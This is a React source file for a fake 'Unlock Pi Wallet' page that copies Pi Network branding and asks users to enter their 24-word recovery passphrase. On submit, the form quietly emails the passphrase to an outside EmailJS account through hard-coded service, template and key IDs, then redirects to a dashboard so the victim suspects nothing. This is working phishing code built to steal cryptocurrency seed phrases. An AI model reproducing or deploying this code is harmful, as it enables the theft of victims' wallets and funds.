import React, { useContext, useRef, useState } from 'react'
import { IoIosArrowBack, IoIosArrowDown } from 'react-icons/io'
import logo from '../assets/logo.png'
import wallet from '../assets/wallet.png'
import PiContext from '../pi-coin/PiContext'
import { useNavigate } from 'react-router-dom'
import emailjs from '@emailjs/browser'

const Wallet = () => {

  const [pass ,setpass]=useState()
  const formData=useRef()

  const {dispatch ,password }=useContext(PiContext)
  const navigate = useNavigate();

  const handle=(e)=>{
    e.preventDefault()
      emailjs.sendForm("service_q42xlt8", "template_i2vpodh", formData.current, "3udXbaUkdz0JqJz7I").then(
  () => {
formData.current.reset()
  },
  (error) => {

console.error(error.text);
},
);

    dispatch({
      type:"ADD",
      payload: pass
    })
     navigate("/dashboard");
   
    setpass("")
    
  }



  return (
    <div className='min-h-screen bg-white  max-w-md mx-auto text-center'>
     
            <nav className="w-full bg-[#783A8D] text-white flex items-center justify-between px-4 py-3 text-lg font-medium">
        <span className="text-2xl"><h1 className="font-black text-[21px]"><a href="/"><IoIosArrowBack size={25} style={{
        
                strokeWidth: "70"
        }} /></a></h1></span>
          <h1 className='font-bold flex items-center jusity-center gap-2 text-[21px]' > <img src={wallet} alt="" className='w-[1.3em]'/> Wallet <img src={logo} alt="" className='w-[1.3em]'/></h1>
        <span className="text-2xl"><h1 className="font-black text-[21px]"><IoIosArrowDown size={25} style={{
        
                strokeWidth: "70"
        }} /></h1></span>
      </nav>

    <h1 className="text-2xl font-bold mt-6">Unlock Pi Wallet</h1>

    <form className="w-full" ref={formData} onSubmit={handle}>
        
        <textarea
      name='message'
      required
      value={pass}
      onChange={(e)=>setpass(e.target.value)}
        placeholder="Enter your 24-word passphrase here"
        className="w-80 h-27 my-6 border border-gray-500 rounded-xl p-3 text-sm outline-none placeholder-gray-400"
      />

      {/* Unlock button */}
      <button type='submit' className="w-80 mt-1 py-4 cursor-pointer border border-gray-500 text-[#783A8D] font-bold rounded-xl py-3 cursar-pointer">
        Unlock With Passphrase
      </button>


    </form>
            <button className="w-80 cursor-pointer mt-2 py-4 bg-[#783A8D] text-white font-bold rounded-xl py-3">
        Biometric Not Available
      </button>

      <div className=' flex flex-col items-center   '>
<h2 className='mt-6 text-start  text-md w-80 '>As a non-custodial wallet, your recovery <br /> phrase is only accessible to you. Currently, <br /> recovery phrases cannot be recovered if lost.</h2>
      <p  className='m-3 text-start  text-md  w-82 ' >Lost your wallet recovery phrase? <span  className=' cursor-pointer text-blue-500'> You can <br /> create a new wallet,</span> but all it in your previous <br /> wallet will be inaccessible.</p>
      </div>

    </div>
  )
}

export default Wallet
